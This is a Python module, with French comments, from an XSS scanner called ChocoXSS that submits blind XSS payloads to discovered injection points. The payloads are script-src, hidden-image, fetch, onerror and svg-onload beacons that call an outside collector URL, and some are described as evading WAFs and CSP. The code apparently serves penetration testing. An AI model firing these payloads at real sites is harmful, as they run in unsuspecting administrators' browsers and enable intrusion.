"""
ChocoXSS — XSS Aveugle (Blind / Out-of-Band)
================================================

Complète reflection_checker.py et stored_checker.py, qui supposent tous
deux qu'on SAIT où chercher le résultat (la réponse immédiate, ou une
check_url précisée). Beaucoup de XSS stockés réels ne remplissent jamais
cette condition : un formulaire de contact lu uniquement dans un panneau
d'administration auquel le testeur n'a pas accès, un signalement modéré
consulté des jours plus tard, un log d'erreur affiché dans un dashboard
interne... Dans tous ces cas, ChocoXSS ne peut physiquement pas vérifier
lui-même si le payload s'exécute, puisque l'exécution a lieu ailleurs,
plus tard, dans un contexte hors de portée du scan.

Principe (technique standard — XSS Hunter, Burp Collaborator) :
  1. Le payload, au lieu d'appeler alert(), déclenche une requête sortante
     (balise <script src>, <img src>, fetch()) vers un serveur collecteur
     que L'UTILISATEUR contrôle et surveille lui-même.
  2. Chaque payload embarque un identifiant unique corrélable au point
     d'injection d'origine (même marqueur que les autres modules).
  3. ChocoXSS SOUMET les payloads sur tous les points d'injection
     découverts, mais NE CONFIRME PAS l'exécution — c'est le rôle du
     collecteur externe, potentiellement des heures/jours plus tard.
     Cette limite est structurelle, pas un manque : par définition, le
     XSS aveugle s'exécute hors du cycle de vie du scan.

ChocoXSS ne fournit PAS de collecteur intégré (nécessiterait une
infrastructure exposée sur Internet, hors de portée d'un outil CLI local).
L'utilisateur doit fournir l'URL de son propre collecteur (Burp Collaborator,
Interactsh, XSS Hunter Express auto-hébergé, ou un simple serveur qui logue
les requêtes entrantes) via --blind-callback.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field

import requests

from modules.active.crawler import InjectionPoint
from modules.active.payload_engine import generate_marker
from modules.active.reflection_checker import _send_payload, ReflectionConfidence
from modules.common.concurrency import run_concurrent


@dataclass
class BlindPayloadTemplate:
    name: str
    template: str    # contient {callback} et {marker}
    description: str


# Callback via balise script — fonctionne dans un contexte HTML_BODY classique
BLIND_TEMPLATES: list[BlindPayloadTemplate] = [
    BlindPayloadTemplate(
        "script_src",
        '<script src="{callback}?id={marker}"></script>',
        "Charge un script distant — le collecteur reçoit la requête même "
        "sans exécution JS supplémentaire nécessaire",
    ),
    BlindPayloadTemplate(
        "img_beacon",
        '<img src="{callback}?id={marker}" style="display:none">',
        "Balise image invisible — fonctionne même si les balises <script> "
        "sont filtrées, contourne certains WAF basiques",
    ),
    BlindPayloadTemplate(
        "fetch_beacon",
        '<script>fetch("{callback}?id={marker}")</script>',
        "Requête fetch() explicite depuis un contexte script exécuté",
    ),
    BlindPayloadTemplate(
        "img_onerror",
        '<img src=x onerror="fetch(\'{callback}?id={marker}\')">',
        "Callback déclenché via onerror — s'exécute même si le tag "
        "<script> est bloqué par un CSP restrictif sur script-src mais "
        "pas sur les gestionnaires d'événements inline",
    ),
    BlindPayloadTemplate(
        "svg_onload",
        '<svg onload="fetch(\'{callback}?id={marker}\')">',
        "Variante SVG onload — contourne les filtres ciblant uniquement <img>",
    ),
]


@dataclass
class BlindSubmission:
    """Une soumission de payload aveugle — pas de résultat de vérification local."""
    injection_point: InjectionPoint
    payload: str
    technique: str
    marker: str              # identifiant unique à corréler dans les logs du collecteur
    description: str
    submit_status: int | None = None
    error: str | None = None


@dataclass
class BlindScanSummary:
    callback_url: str
    submissions: list[BlindSubmission] = field(default_factory=list)

    @property
    def successful_submissions(self) -> list[BlindSubmission]:
        return [s for s in self.submissions if s.error is None]

    def correlation_table(self) -> list[tuple[str, str, str]]:
        """
        Retourne [(marker, param_name, url_soumission)] pour aider
        l'utilisateur à recouper les logs du collecteur avec le point
        d'injection d'origine.
        """
        return [
            (s.marker, s.injection_point.param_name, s.injection_point.url)
            for s in self.successful_submissions
        ]


def build_blind_payloads(callback_url: str, marker: str) -> list[tuple[str, str, str]]:
    """
    Instancie les templates de callback avec l'URL du collecteur et un
    marqueur unique par payload (pas juste par scan) pour corréler
    précisément quel point d'injection a déclenché quel hit côté collecteur.

    Returns:
        Liste de tuples (payload_final, technique, description)
    """
    return [
        (t.template.format(callback=callback_url.rstrip("/"), marker=marker), t.name, t.description)
        for t in BLIND_TEMPLATES
    ]


def submit_blind_payloads(
    injection_points: list[InjectionPoint],
    callback_url: str,
    timeout: int = 10,
    delay: float = 0.0,
    session: requests.Session | None = None,
    verify: bool = True,
    max_workers: int = 1,
) -> BlindScanSummary:
    """
    Soumet des payloads de callback sur chaque point d'injection découvert.

    Contrairement à scan_all_points()/check_stored_xss(), cette fonction
    ne classe AUCUN résultat en RAW/ENCODED/PARTIAL — elle se contente de
    soumettre et d'enregistrer un marqueur corrélable par point, à vérifier
    manuellement dans les logs du collecteur externe (potentiellement bien
    après la fin du scan).

    Args:
        injection_points: points d'injection découverts par le crawler
        callback_url: URL du collecteur contrôlé par l'utilisateur
            (Burp Collaborator, Interactsh, serveur de logs custom...)
        timeout: délai HTTP par soumission
        delay: pause entre chaque soumission
        session: session requests réutilisable (cookies, headers custom)
        verify: vérification du certificat SSL, passée explicitement à
            chaque requête (voir chocoxss.py --insecure)
        max_workers: 1 (défaut) = un point d'injection à la fois. > 1 =
            soumet sur plusieurs points en parallèle via un pool de
            threads — voir chocoxss.py --threads.

    Returns:
        BlindScanSummary avec un BlindSubmission par (point × technique),
        chacun portant un marqueur unique à rechercher dans le collecteur.
    """
    sess = session or requests.Session()
    sess.headers.setdefault("User-Agent", "ChocoXSS/0.1")

    summary = BlindScanSummary(callback_url=callback_url)

    tasks = [
        (lambda p=point: _submit_blind_payloads_for_point(p, callback_url, timeout, delay, sess, verify))
        for point in injection_points
    ]
    all_results = run_concurrent(tasks, max_workers=max_workers)

    for submissions in all_results:
        summary.submissions.extend(submissions)

    return summary


def _submit_blind_payloads_for_point(
    point: InjectionPoint,
    callback_url: str,
    timeout: int,
    delay: float,
    sess: requests.Session,
    verify: bool,
) -> list[BlindSubmission]:
    """
    Soumet toutes les techniques de callback sur UN point d'injection —
    c'est cette fonction qui tourne en parallèle entre points quand
    max_workers > 1 dans submit_blind_payloads().
    """
    marker = generate_marker()
    payloads = build_blind_payloads(callback_url, marker)
    submissions: list[BlindSubmission] = []

    for payload, technique, description in payloads:
        if delay:
            time.sleep(delay)

        _, status, error = _send_payload(point, payload, timeout, sess, verify=verify)

        submissions.append(BlindSubmission(
            injection_point=point, payload=payload, technique=technique,
            marker=marker, description=description,
            submit_status=status, error=error,
        ))

    return submissions
